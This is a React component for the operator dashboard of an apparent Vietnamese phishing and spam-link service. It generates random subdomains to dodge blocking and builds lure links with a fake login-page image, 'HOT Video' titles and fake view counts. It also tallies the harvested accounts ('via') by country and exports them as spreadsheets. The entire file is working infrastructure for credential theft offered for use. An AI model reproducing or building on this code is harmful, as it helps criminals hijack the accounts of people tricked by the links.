import React, { useState, useEffect } from "react";
import axios from "axios";
import { useAuth } from "../context/AuthContext";
import "./Profile.css";
import { useNavigate } from "react-router-dom";

const Profile = () => {
  const { user } = useAuth();
  const navigate = useNavigate();

  // Function to generate random subdomain
  const generateRandomSubdomain = () => {
    const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
    const length = Math.floor(Math.random() * 5) + 8; // Random length between 8-12
    let result = "";
    for (let i = 0; i < length; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  };

  const [links, setLinks] = useState([]);
  const [stats, setStats] = useState({
    totalVisits: 0,
    countryStats: {},
    onlineCount: 0,
    onlineByCountry: {},
  });
  const [formData, setFormData] = useState({
    subdomain: generateRandomSubdomain(),
    domain: "n-cep.com",
    shareImage: "",
    loginImage: "",
    spamTitle: "",
    spamContent: "",
    language: "tbn",
  });
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(true);

  const [domains] = useState(["n-cep.com", "other-domain.com"]); // Add your domain options
  const [languages] = useState(["tbn", "bdn", "other"]); // Add your language options

  // Function to update URL with new subdomain
  const updateUrlWithNewSubdomain = (url) => {
    const subdomain = generateRandomSubdomain();
    return `https://${subdomain}.n-cep.com`;
  };

  // Function to fetch data
  const fetchData = async () => {
    try {
      const token = localStorage.getItem("token");
      const response = await axios.get(
        "https://spamlink.onrender.com/api/linkInfo",
        {
          headers: { Authorization: `Bearer ${token}` },
        }
      );
      setLinks(response.data);
    } catch (err) {
      console.error("Error fetching data:", err);
    }
  };

  const fetchStats = async () => {
    try {
      const token = localStorage.getItem("token");
      const response = await axios.get(
        "https://spamlink.onrender.com/api/linkInfo/stats/all",
        {
          headers: { Authorization: `Bearer ${token}` },
        }
      );
      setStats(response.data);
    } catch (err) {
      console.error("Error fetching stats:", err);
    }
  };

  // Fetch user's links and stats, and update URLs with new subdomains
  useEffect(() => {
    fetchData();
    fetchStats();
    // Refresh stats more frequently (every 10 seconds) to catch new visits
    const interval = setInterval(fetchData, 10000);
    return () => clearInterval(interval);
  }, []);

  const handleChange = (e) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value,
    });
  };

  // Function to generate new random subdomain for form
  const handleGenerateNew = () => {
    setFormData((prev) => ({
      ...prev,
      subdomain: generateRandomSubdomain(),
    }));
  };

  // Function to generate new random subdomain for a specific link
  const handleRegenerateLink = async (linkId) => {
    try {
      const token = localStorage.getItem("token");
      const subdomain = generateRandomSubdomain();
      const url = `https://${subdomain}.n-cep.com`;
      const redirectUrl = `https://spamlink.onrender.com/r/${subdomain}`;

      const response = await axios.post(
        `https://spamlink.onrender.com/api/linkInfo/${linkId}/regenerate`,
        {
          subdomain,
          url,
          originalUrl: redirectUrl,
        },
        {
          headers: { Authorization: `Bearer ${token}` },
        }
      );

      if (response.data) {
        setLinks(
          links.map((link) =>
            link._id === linkId
              ? {
                  ...link,
                  subdomain,
                  url,
                  originalUrl: redirectUrl,
                }
              : link
          )
        );
      }
    } catch (err) {
      console.error("Error regenerating:", err);
      setError("Không thể tạo lại subdomain. Vui lòng thử lại.");
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      const token = localStorage.getItem("token");
      const subdomain = generateRandomSubdomain();
      const url = `https://${subdomain}.n-cep.com`;
      const redirectUrl = `https://spamlink.onrender.com/r/${subdomain}`;

      const response = await axios.post(
        "https://spamlink.onrender.com/api/linkInfo",
        {
          subdomain,
          url,
          originalUrl: redirectUrl,
          features: {
            shareImage: formData.shareImage,
            loginImage: formData.loginImage,
            spamTitle: formData.spamTitle,
            spamContent: formData.spamContent,
            language: formData.language,
          },
        },
        {
          headers: { Authorization: `Bearer ${token}` },
        }
      );

      if (response.data) {
        const newLink = {
          ...response.data,
          features: {
            shareImage: formData.shareImage,
            loginImage: formData.loginImage,
            spamTitle: formData.spamTitle,
            spamContent: formData.spamContent,
            language: formData.language,
          },
        };
        setLinks([newLink, ...links]);
        setFormData({
          shareImage: "",
          loginImage: "",
          spamTitle: "",
          spamContent: "",
          language: "en",
        });
      }
    } catch (err) {
      console.error("Error creating link:", err);
      setError(
        err.response?.data?.message || "Không thể tạo link. Vui lòng thử lại."
      );
    }
  };

  const handleDelete = async (id) => {
    try {
      const token = localStorage.getItem("token");
      await axios.delete(`https://spamlink.onrender.com/api/linkInfo/${id}`, {
        headers: { Authorization: `Bearer ${token}` },
      });
      setLinks(links.filter((link) => link._id !== id));
    } catch (error) {
      console.error("Error deleting link:", error);
      alert("Error deleting link. Please try again.");
    }
  };

  const fetchLinks = async () => {
    try {
      const token = localStorage.getItem("token");
      const response = await axios.get("/api/links", {
        headers: { Authorization: `Bearer ${token}` },
      });
      setLinks(response.data);
    } catch (err) {
      setError(err.response?.data?.message || "Error fetching links");
    }
  };

  // Add download handlers
  const handleDownloadAll = async () => {
    try {
      const token = localStorage.getItem("token");
      const response = await axios.get("/api/linkInfo/stats/download", {
        headers: {
          Authorization: `Bearer ${token}`,
          "Content-Type": "application/json",
        },
        responseType: "blob",
      });

      const url = window.URL.createObjectURL(new Blob([response.data]));
      const link = document.createElement("a");
      link.href = url;
      link.setAttribute(
        "download",
        `all_visits_${new Date().toISOString().split("T")[0]}.xlsx`
      );
      document.body.appendChild(link);
      link.click();
      link.remove();
    } catch (error) {
      console.error("Error downloading data:", error);
      setError("Error downloading data");
    }
  };

  const handleDownloadCountry = async (country) => {
    try {
      const token = localStorage.getItem("token");
      const response = await axios.get(
        `/api/linkInfo/stats/download/${country}`,
        {
          headers: {
            Authorization: `Bearer ${token}`,
            "Content-Type": "application/json",
          },
          responseType: "blob",
        }
      );

      const url = window.URL.createObjectURL(new Blob([response.data]));
      const link = document.createElement("a");
      link.href = url;
      link.setAttribute(
        "download",
        `visits_${country}_${new Date().toISOString().split("T")[0]}.xlsx`
      );
      document.body.appendChild(link);
      link.click();
      link.remove();
    } catch (error) {
      console.error("Error downloading country data:", error);
      setError("Error downloading country data");
    }
  };

  const handleClearAll = async () => {
    if (window.confirm("Bạn có chắc muốn xóa tất cả via?")) {
      try {
        const token = localStorage.getItem("token");
        await axios.delete("/api/linkInfo/stats/clear", {
          headers: { Authorization: `Bearer ${token}` },
        });
        // Refresh stats after clearing
        fetchData();
      } catch (error) {
        console.error("Error clearing data:", error);
        setError("Error clearing data");
      }
    }
  };

  if (loading) return <div>Loading...</div>;
  if (error) return <div className="error">{error}</div>;

  return (
    <div className="profile-page">
      <div className="profile-header">
        <h2>
          Xin chào {user?.username} - Số link đã tạo: {links.length}
        </h2>
      </div>

      <div className="warning-message">
        Lưu ý! Subdomain nào không dùng vui lòng xoá bớt đi để tránh bị chặn ko
        xài được nữa.
      </div>

      <div className="update-message">
        Update! Link Spam thêm chuỗi kí tự sau hạn chế die domain, AE có F5 ra
        link mới
      </div>

      <div className="content-container">
        <div className="create-link-form">
          <form onSubmit={handleSubmit}>
            <div className="form-group">
              <label>Subdomain</label>
              <div className="subdomain-group">
                <input
                  type="text"
                  name="subdomain"
                  value={formData.subdomain}
                  onChange={handleChange}
                  placeholder="Nhập subdomain"
                  required
                />
              </div>
            </div>

            <div className="form-group">
              <label>Chọn domain</label>
              <select
                name="domain"
                value={formData.domain}
                onChange={handleChange}
                required
              >
                {domains.map((domain) => (
                  <option key={domain} value={domain}>
                    {domain}
                  </option>
                ))}
              </select>
            </div>

            <div className="form-group">
              <label>Ảnh hiển thị</label>
              <input
                type="text"
                name="shareImage"
                value={formData.shareImage}
                onChange={handleChange}
                placeholder="Link ảnh hiển thị share"
                required
              />
            </div>

            <div className="form-group">
              <label>Link ảnh trang đăng nhập</label>
              <input
                type="text"
                name="loginImage"
                value={formData.loginImage}
                onChange={handleChange}
                placeholder="Link ảnh trang đăng nhập"
                required
              />
            </div>

            <div className="form-group">
              <label>Tiêu đề spam</label>
              <input
                type="text"
                name="spamTitle"
                value={formData.spamTitle}
                onChange={handleChange}
                placeholder="HOT Video"
                required
              />
            </div>

            <div className="form-group">
              <label>Nội dung dưới tiêu đề</label>
              <input
                type="text"
                name="spamContent"
                value={formData.spamContent}
                onChange={handleChange}
                placeholder="1,356,198 views"
                required
              />
            </div>

            <div className="form-group">
              <label>Chọn ngôn ngữ</label>
              <select
                name="language"
                value={formData.language}
                onChange={handleChange}
                required
              >
                {languages.map((lang) => (
                  <option key={lang} value={lang}>
                    {lang}
                  </option>
                ))}
              </select>
            </div>

            <button type="submit" className="create-button">
              Tạo domain
            </button>
          </form>
        </div>

        <div className="links-table">
          <table>
            <thead>
              <tr>
                <th>#</th>
                <th>Link</th>
                <th>Ảnh share</th>
                <th>Ảnh nền</th>
                <th>Ngôn ngữ</th>
                <th>Thêm lúc</th>
                <th>Thao tác</th>
              </tr>
            </thead>
            <tbody>
              {links.map((link, index) => (
                <tr key={link._id}>
                  <td>{index + 1}</td>
                  <td className="link-cell">
                    <input type="text" value={link.url} readOnly />
                  </td>
                  <td>
                    <img
                      src={link.features?.shareImage || ""}
                      alt="Share"
                      className="preview-image"
                    />
                  </td>
                  <td>
                    <img
                      src={link.features?.loginImage || ""}
                      alt="Login"
                      className="preview-image"
                    />
                  </td>
                  <td>{link.features?.language || "N/A"}</td>
                  <td>{new Date(link.createdAt).toLocaleString()}</td>
                  <td>
                    <button
                      onClick={() => handleDelete(link._id)}
                      className="delete-button"
                    >
                      Xóa
                    </button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>

      <div className="stats-section">
        <div className="stats-header">
          <div className="total-visits-header">
            Tổng via thu được:{" "}
            <span className="visits-count">{stats.totalVisits || 0}</span>
          </div>
          <button className="download-all" onClick={handleDownloadAll}>
            Tải về toàn bộ
          </button>
          <button className="clear-all" onClick={handleClearAll}>
            Xoá toàn bộ
          </button>
        </div>

        <div className="stats-content">
          <div className="country-stats-list">
            <h3>Via theo quốc gia:</h3>
            {Object.entries(stats.countryStats || {}).map(
              ([country, count]) => (
                <div key={country} className="country-stat-item">
                  <div className="country-info">
                    <span className="country-code">{country}</span>
                    <span className="country-count">{count} via</span>
                  </div>
                  <button
                    className="download-country"
                    onClick={() => handleDownloadCountry(country)}
                  >
                    Tải về
                  </button>
                </div>
              )
            )}
          </div>

          <div className="online-stats">
            <h3>Đang online (5 phút gần đây):</h3>
            <div className="online-count">
              Tổng số:{" "}
              <span className="highlight">{stats.onlineCount || 0}</span>
            </div>
            {Object.entries(stats.onlineByCountry || {}).map(
              ([country, count]) => (
                <div key={country} className="online-country-item">
                  <span className="country-code">{country}</span>
                  <span className="online-count">{count} online</span>
                </div>
              )
            )}
          </div>
        </div>
      </div>
    </div>
  );
};

export default Profile;
